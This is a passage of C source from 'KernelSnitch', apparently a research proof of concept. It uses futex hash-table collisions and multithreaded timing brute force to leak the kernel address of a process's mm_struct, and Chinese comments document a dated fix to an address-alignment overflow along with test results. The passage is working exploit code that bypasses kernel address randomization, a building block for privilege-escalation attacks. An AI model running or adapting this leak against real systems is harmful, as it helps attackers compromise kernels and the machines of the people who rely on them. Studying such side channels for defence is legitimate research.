    ckpt_val("bf_collisions", (long)ks->collisions);
    ckpt_val("bf_hashsize", (long)futex_hashsize);
    ckpt_val("bf_futex_addr0", (long)ks->futex_addrs[0]);
    for (size_t z = 1; z < ks->collisions; ++z) {
        char key[32];
        snprintf(key, sizeof(key), "bf_futex_addr%zu", z);
        ckpt_val(key, (long)ks->futex_addrs[z]);
    }

    for (size_t i = 0; i < ks->thread_cnt; ++i) {
        struct mm_leak_arg *mm_leak_arg = (struct mm_leak_arg *)SYSCHK(calloc(1, sizeof(struct mm_leak_arg)));
        mm_leak_arg->ks = ks;
        mm_leak_arg->range.id = i;
        mm_leak_arg->range.start = ks->id_start + ks->identity_diff*i;
        mm_leak_arg->range.end = ks->id_start + ks->identity_diff*(i+1);
        if ((mm_leak_arg->range.start % COARSE_SZ) != 0)
            mm_leak_arg->range.start = (mm_leak_arg->range.start & ~(COARSE_SZ - 1));
        /* ===== gK78 关键修复（A 级定案 2026-10-23）：end 向上对齐溢出 =====
         * [根因] 原代码：
         *     if (end % COARSE_SZ) end = (end & ~(COARSE_SZ-1)) + COARSE_SZ;
         *   最后一个线程的 end 接近 SIZE_MAX（0xffffffffffffffff）：
         *     end = 0xfffffffffffffff8
         *     (end & ~0x3fffffff) + 0x40000000 = 0x10000000000000000
         *   ⇒ size_t 截断为 0
         *   ⇒ __mm_leak 里 for(c=start; c<0; c+=COARSE) 立即不成立
         *   ⇒ 该线程【整个区间一次都没扫】
         * [实测证据] 离线复刻内核三层循环，cand/P1/P2/P3/TOLH 与真机逐数字一致
         *   （278855680 / 543861 / 390 / 0 / 0），
         *   单点验证 0xfffffffa8cab7700 处 hits=4/4、网格 PASS，
         *   但模拟 BEST=0 ⇒ 证明该区间未被扫描。
         * [影响] thread 7 覆盖 ~33GiB（全范围 12.9%）。
         *   真 mm 落在高地址区时 TOLH 恒为 0 ⇒ 概率性失败（解释历史时好时坏）。
         * [修复] 检测溢出并钳到 SIZE_MAX。 */
        if ((mm_leak_arg->range.end % COARSE_SZ) != 0) {
            size_t up = (mm_leak_arg->range.end & ~(COARSE_SZ - 1)) + COARSE_SZ;
            /* 溢出（up < end）⇒ 钳到最大地址，保证覆盖到区间末尾 */
            mm_leak_arg->range.end = (up < mm_leak_arg->range.end) ? (size_t)-1 : up;
        }
        SYSCHK(pthread_create(&ks->tids[i], 0, __mm_leak, mm_leak_arg));
    }
    for (size_t i = 0; i < ks->thread_cnt; ++i)
        pthread_join(ks->tids[i], 0);
    /* gK45：bruteforce 结束可见 */
    ckpt_val("bf_found", (long)ks->found);
    ckpt_val("bf_mm_struct", (long)ks->mm_struct);
    ckpt_val("bf_mm_is_minus1", ks->mm_struct == (size_t)-1 ? 1 : 0);
    ckpt_val("bf_cand_cnt", (long)ks->cand_cnt);
    ckpt_val("bf_pass1", (long)ks->pass1);
    ckpt_val("bf_pass2", (long)ks->pass2);
    ckpt_val("bf_pass3", (long)ks->pass3);
    ckpt_val("bf_tol", (long)ks->tol);
    ckpt_val("bf_tol_hits", (long)ks->tol_hits);
    ckpt_val("bf_tol_best_hits", (long)ks->tol_best_hits);
    /* ★ 2026-10-22：mm_struct 初值已改为 0，不能再拿 -1 判 NOT_FOUND。
     * 统一以 ks->found 为准；未命中时把 mm_struct 复位成 -1，
     * 保持 util.c 里 `leaked == (uintptr_t)-1` 的原有契约不变。 */
    if (!ks->found) ks->mm_struct = (size_t)-1;
    ks->state = (ks->mm_struct == (size_t)-1) ? KERNELSNITCH_MM_NOT_FOUND : KERNELSNITCH_MM_FOUND;
}

/**
 * Cleanup phase for KernelSnitch
 * @arg ks: shared KernelSnitch state
 * @return the found mm_struct or -1 for not found
 */
size_t kernelsnitch_cleanup(struct kernelsnitch_shared_state *ks)
{
    ASSERT_pr((ks->state == KERNELSNITCH_MM_FOUND || ks->state == KERNELSNITCH_MM_NOT_FOUND), "wrong state\n");
    munmap((void *)ks->times, sizeof(size_t)*ks->total_futexes);
    ks->times = 0;
    munmap((void *)ks->tids, sizeof(pthread_t)*ks->thread_cnt);
    ks->tids = 0;
    munmap((void *)ks->futex_addrs, sizeof(size_t)*(ks->collisions + 1));
    ks->futex_addrs = 0;
    munmap((void *)ks->futexes, FUTEX_SZ);
    ks->futexes = 0;
    size_t ret = ks->mm_struct;
    if (ks->verbose) pr_info("done\n");
    munmap(ks, sizeof(struct kernelsnitch_shared_state));
    return ret;
}

/**
 * Performs KernelSnitch
 * @arg __mm_struct_sz: sizeof(mm_struct) needed for the bruteforcing phase
 * @arg __mm_slab_order: the order of the mm_struct slab
 * @arg __thread_cnt: thread count used for the bruteforcing phase
 * @arg __collision_cnt: collision count to then try to correlate the mm_struct address to the user addresses
 * @arg __verbose: amount of print info (1...enabled; 0...disabled)
 * @arg __mte_enabled: is mte enabled on the victim system (1...enabled; 0...disabled)
 * @return the found mm_struct or -1 for not found
 */
size_t kernelsnitch_param(size_t __mm_struct_sz, size_t __mm_slab_order, size_t __thread_cnt, size_t __collision_cnt, size_t __verbose, size_t __mte_enabled)
{
    struct kernelsnitch_shared_state *ks = kernelsnitch_setup(__mm_struct_sz, __mm_slab_order, __thread_cnt, __collision_cnt, __verbose, __mte_enabled);
    if (ks->verbose) pr_info("===============================================\n");
    kernelsnitch_find_collisions(ks);
    if (ks->verbose) pr_info("===============================================\n");
    kernelsnitch_bruteforce(ks);
    if (ks->verbose) pr_info("===============================================\n");
    return kernelsnitch_cleanup(ks);
}

/**
 * Prints the current execution state KernelSnitch is in
 * @arg ks: shared KernelSnitch state
 */
void kernelsnitch_print_state(struct kernelsnitch_shared_state *ks)
{
    pr_info("ks state: %s\n", kernelsnitch_strings[ks->state]);
}

/**
 * Prints the found collisions
 * @arg ks: shared KernelSnitch state
 */
void kernelsnitch_print_collisions(struct kernelsnitch_shared_state *ks)
{
    pr_info("collisions:\n");
    for (size_t i = 2; i < ks->collisions; ++i) {
        size_t addr = ks->futex_addrs[i];
        pr_info("  %016zx\n", addr);
    }
}

/**
 * KernelSnitch
 * @arg __mm_struct_sz: sizeof(mm_struct) needed for the bruteforcing phase
 * @return: the found mm_struct address
 */
size_t kernelsnitch(size_t __mm_struct_sz, size_t __mm_slab_order)
{
    return kernelsnitch_param(__mm_struct_sz, __mm_slab_order, sysconf(_SC_NPROCESSORS_ONLN)*2, 16, 0, 0);
}
